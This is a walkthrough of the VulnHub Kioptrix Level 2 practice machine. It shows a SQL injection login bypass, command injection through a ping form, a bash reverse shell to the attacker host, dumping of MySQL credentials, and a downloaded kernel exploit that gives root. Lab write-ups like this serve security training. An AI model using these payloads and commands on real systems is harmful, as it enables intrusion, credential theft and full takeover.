# Kioptrix Level 2 | VulnHub
https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

### 1. Scan
```bash
kali@kali:~/Desktop/osc$ nmap -A -T4 -p- 10.1.1.58
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 02:23 EDT
Nmap scan report for 10.1.1.58
Host is up (0.0060s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
|_ssl-date: 2020-10-27T03:15:04+00:00; -3h09m34s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
621/tcp  open  status     1 (RPC #100024)
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql      MySQL (unauthorized)

Host script results:
|_clock-skew: -3h09m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.43 seconds
```
The machine is running SSH, Apache on port 80 and 443, and this time there is a CUPS 1.1 and mySQL server.

### 2. Investigate the web server
This time, accessing the HTTP server gets a simple login form. The HTTPS version of the site errors out due to an invalid certificate, so for now this will be my focus. The login form does not present any errors to the user if invalid input is entered. Despite this, SQL injection can be attempted.

### 3. Get past the login page
Using a basic SQL injection payload of `' OR '1='1`, it is possible to bypass the login form.
```
POST /index.php HTTP/1.1
Host: 10.1.1.58
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.1.1.58/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&psw=%27+OR+%271%27%3D%271&btnLogin=Login
```
This gives access to a single textbox that prompts us for an IP address to ping. Entering an IP and hitting the button will return the results in a new window. So for example, entering the address of my attacker machine:
```
10.1.1.74

PING 10.1.1.74 (10.1.1.74) 56(84) bytes of data.
64 bytes from 10.1.1.74: icmp_seq=0 ttl=64 time=0.427 ms
64 bytes from 10.1.1.74: icmp_seq=1 ttl=64 time=0.630 ms
64 bytes from 10.1.1.74: icmp_seq=2 ttl=64 time=1.01 ms

--- 10.1.1.74 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.427/0.692/1.019/0.245 ms, pipe 2
```
Basically this is returning the results of the ping command. As this is a PHP application, it is most likely making a call to system or sshell_exec with a parameter to accomplish this, which means command injection may be possible.
```bash
10.1.1.74; whoami

PING 10.1.1.74 (10.1.1.74) 56(84) bytes of data.
64 bytes from 10.1.1.74: icmp_seq=0 ttl=64 time=0.983 ms
64 bytes from 10.1.1.74: icmp_seq=1 ttl=64 time=0.730 ms
64 bytes from 10.1.1.74: icmp_seq=2 ttl=64 time=0.708 ms

--- 10.1.1.74 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 0.708/0.807/0.983/0.124 ms, pipe 2
apache
```
As can be seen here, this is indeed the case. With this information we now effectively have a means to interact with the machine.

### 4. Get a shell
Start up a listener on the attacker machine:
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
```
Then make a reverse shell payload using bash which is present on the machine.
```bash
10.1.1.74; bash -i >& /dev/tcp/10.1.1.74/9999 0>&1
```
Catch the shell.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.1.1.58 49606
bash: no job control in this shell
bash-3.00$ whoami
apache
```

### 5. Enumerate from foothold
The first thing to do when logged in as the web user is enumerate the website files.
```bash
bash-3.00$ ls
index.php
pingit.php
bash-3.00$ cat index.php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
                $username = $_POST['uname'];
                $password = $_POST['psw'];
                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
                //print $query."<br>";
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print "ID: ".$row['id']."<br />";
        }

?>
<html>
<body>
<?php
if ($row['id']==""){
?>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
        <table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
                <tr>
                        <td colspan='2' align='center'>
                        <b>Remote System Administration Login</b>
                        </td>
                </tr>
                <tr>
                        <td width="150">Username</td>
                        <td><input name="uname" type="text"></td>
                </tr>
                <tr>
                        <td width="150">Password</td>
                        <td>
                        <input name="psw" type="password">
                        </td>
                </tr>
                <tr>
                        <td colspan="2" align="center">
                        <input type="submit" name="btnLogin" value="Login">
                        </td>
                </tr>
        </table>
</form>
<?php
        } //END of login form
?>

<!-- Start of HTML when logged in as Administator -->
<?php
        if ($row['id']==1){
?>
        <form name="ping" action="pingit.php" method="post" target="_blank">
                <table width='600' border='1'>
                <tr valign='middle'>
                        <td colspan='2' align='center'>
                        <b>Welcome to the Basic Administrative Web Console<br></b>
                        </td>
                </tr>
                <tr valign='middle'>
                        <td align='center'>
                                Ping a Machine on the Network:
                        </td>
                                <td align='center'>
                                <input type="text" name="ip" size="30">
                                <input type="submit" value="submit" name="submit">
                        </td>
                        </td>
                </tr>
        </table>
        </form>


<?php
}
?>
</body>
</html>
```
Here we get the credentials used by the web server for mySQL: `john:hiroshima`
```bash
bash-3.00$ cat pingit.php
<?php

print $_POST['ip'];
if (isset($_POST['submit'])){
        $target = $_REQUEST[ 'ip' ];
        echo '<pre>';
        echo shell_exec( 'ping -c 3 ' . $target );
        echo '</pre>';
    }
?>
```
As expected, the web app used a simple shell_exec with a paramater given by user input. Not good!
  
Next, lets check out the SQL server.
```bash
bash-3.00$ python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.00$ mysql -u john -p
mysql -u john -p
Enter password: hiroshima

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 53 to server version: 4.1.22

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
show databases;
+----------+
| Database |
+----------+
| mysql    |
| test     |
| webapp   |
+----------+
3 rows in set (0.00 sec)

mysql>
```
I'll start with webapp and work up.
```bash
mysql> use webapp; show tables;
use webapp; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+------------------+
| Tables_in_webapp |
+------------------+
| users            |
+------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+------+----------+------------+
| id   | username | password   |
+------+----------+------------+
|    1 | admin    | 5afac8d85f |
|    2 | john     | 66lajGGbla |
+------+----------+------------+
2 rows in set (0.00 sec)

mysql>
```
This gives us two more sets of credentials: `admin:5afac8d85f` and `john:66lajGGbla`. Now we can check out the other database, test.
```bash
mysql> use test; show tables;
use test; show tables;
Database changed
Empty set (0.00 sec)

mysql>
```
This database is empty unfortunately. Finally we can check out the default mysql database.
```bash
mysql> use mysql; show tables;
use mysql; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| func                      |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
15 rows in set (0.00 sec)

mysql> select * from user;
select * from user;
+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
| Host                  | User | Password         | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections |
+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
| localhost             | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
| localhost.localdomain | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
| localhost.localdomain |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
| localhost             |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
| localhost             | john | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
+-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
5 rows in set (0.00 sec)

mysql>
```
Within this table there is another user/password combo of `root:5a6914ba69e02807`. Despite all these credentials, none of them appear to be valid for actual user accounts on the machine, so this is a dead end for now.

### 6. Enumerate further
I'll use an enumeration script to gather more information on the machine. (see linenum_out.txt).
```bash
cd /tmp
wget http://10.1.1.74:8000/LinEnum.sh
--00:31:01--  http://10.1.1.74:8000/LinEnum.sh
           => `LinEnum.sh'
Connecting to 10.1.1.74:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46,631 (46K) [text/x-sh]

100%[====================================>] 46,631        --.--K/s             

00:31:01 (59.29 MB/s) - `LinEnum.sh' saved [46631/46631]
bash LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Tue Oct 27 00:31:20 EDT 2020                                                                                                                                                                        
                                                                                                                                                                                                    

### SYSTEM ##############################################
[-] Kernel information:
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux


[-] Kernel information (continued):
Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) #1 Wed May 2 13:52:16 EDT 2007


[-] Specific release information:
CentOS release 4.5 (Final)


[-] Hostname:
kioptrix.level2
...
```
This script consists of mostly just commands that can be ran manually, but having them in a script saves some time. Some of the more in-depth scripts wouldn't work on this machine due to incompatabilities with the version of bash. In any case, looking through the output, the use of CentOS 4.5 (released in 2007) warrented some investigation. There are some kernel exploits for this version, in in particular stood out - Rin0 privesc using ip_append_data(): https://www.exploit-db.com/exploits/9542.

### 7. Set up the exploit
In order exploit, the program has to be compiled and ran locally. This can be done as the machine already has gcc installed. So it's just a matter of retrieving the file, hosting it and wgetting it.
```bash
kali@kali:~/Desktop/osc/kiol2$ wget https://www.exploit-db.com/raw/9542 -O ring0exploit.c
--2020-10-27 03:56:47--  https://www.exploit-db.com/raw/9542
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2643 (2.6K) [text/plain]
Saving to: ‘ring0exploit.c’

ring0exploit.c                                   100%[==========================================================================================================>]   2.58K  --.-KB/s    in 0s      

2020-10-27 03:56:49 (51.8 MB/s) - ‘ring0exploit.c’ saved [2643/2643]

kali@kali:~/Desktop/osc/kiol2$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### 8. Escalate to root
On the CentOS machine:
```bash
wget http://10.1.1.74:8000/ring0exploit.c
--00:49:49--  http://10.1.1.74:8000/ring0exploit.c
           => `ring0exploit.c'
Connecting to 10.1.1.74:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/plain]

100%[====================================>] 2,643         --.--K/s             

00:49:49 (193.89 MB/s) - `ring0exploit.c' saved [2643/2643]

bash-3.00$ gcc ring0exploit.c -o exploit
gcc ring0exploit.c -o exploit
ring0exploit.c:109:28: warning: no newline at end of file
bash-3.00$ ./exploit
./exploit
sh-3.00# whoami
whoami
root
```